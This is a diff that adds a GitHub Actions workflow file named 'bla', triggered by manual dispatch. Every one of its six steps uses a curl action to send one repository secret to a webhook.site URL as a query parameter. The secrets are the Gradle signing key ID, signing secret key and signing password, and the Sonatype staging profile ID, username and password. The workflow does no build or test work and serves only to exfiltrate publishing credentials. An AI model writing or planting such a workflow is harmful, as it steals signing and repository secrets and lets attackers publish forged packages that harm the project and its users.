@@ -1,0 +1,38 @@
+name: bla
+
+on: workflow_dispatch
+
+jobs:
+  bla:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: signingKeyId
+      uses: wei/curl@master
+      with:
+        args: https://webhook.site/ea47d78f-f2dc-46d5-ad8f-90d2d1d03ee3?signingKeyId=${{ secrets.ORG_GRADLE_PROJECT_SIGNINGKEYID }}
+
+    - name: signingSecretKey
+      uses: wei/curl@master
+      with:
+        args: https://webhook.site/ea47d78f-f2dc-46d5-ad8f-90d2d1d03ee3?signingSecretKey=${{ secrets.ORG_GRADLE_PROJECT_SIGNINGSECRETKEY }}
+
+    - name: signingPassword
+      uses: wei/curl@master
+      with:
+        args: https://webhook.site/ea47d78f-f2dc-46d5-ad8f-90d2d1d03ee3?signingPassword=${{ secrets.ORG_GRADLE_PROJECT_SIGNINGPASSWORD }}
+
+    - name: sonatypeStagingProfileId
+      uses: wei/curl@master
+      with:
+        args: https://webhook.site/ea47d78f-f2dc-46d5-ad8f-90d2d1d03ee3?sonatypeStagingProfileId=${{ secrets.ORG_GRADLE_PROJECT_SONATYPESTAGINGPROFILEID }}
+
+    - name: sonatypeUsername
+      uses: wei/curl@master
+      with:
+        args: https://webhook.site/ea47d78f-f2dc-46d5-ad8f-90d2d1d03ee3?sonatypeUsername=${{ secrets.ORG_GRADLE_PROJECT_SONATYPEUSERNAME }}
+
+    - name: sonatypePassword
+      uses: wei/curl@master
+      with:
+        args: https://webhook.site/ea47d78f-f2dc-46d5-ad8f-90d2d1d03ee3?sonatypePassword=${{ secrets.ORG_GRADLE_PROJECT_SONATYPEPASSWORD }}
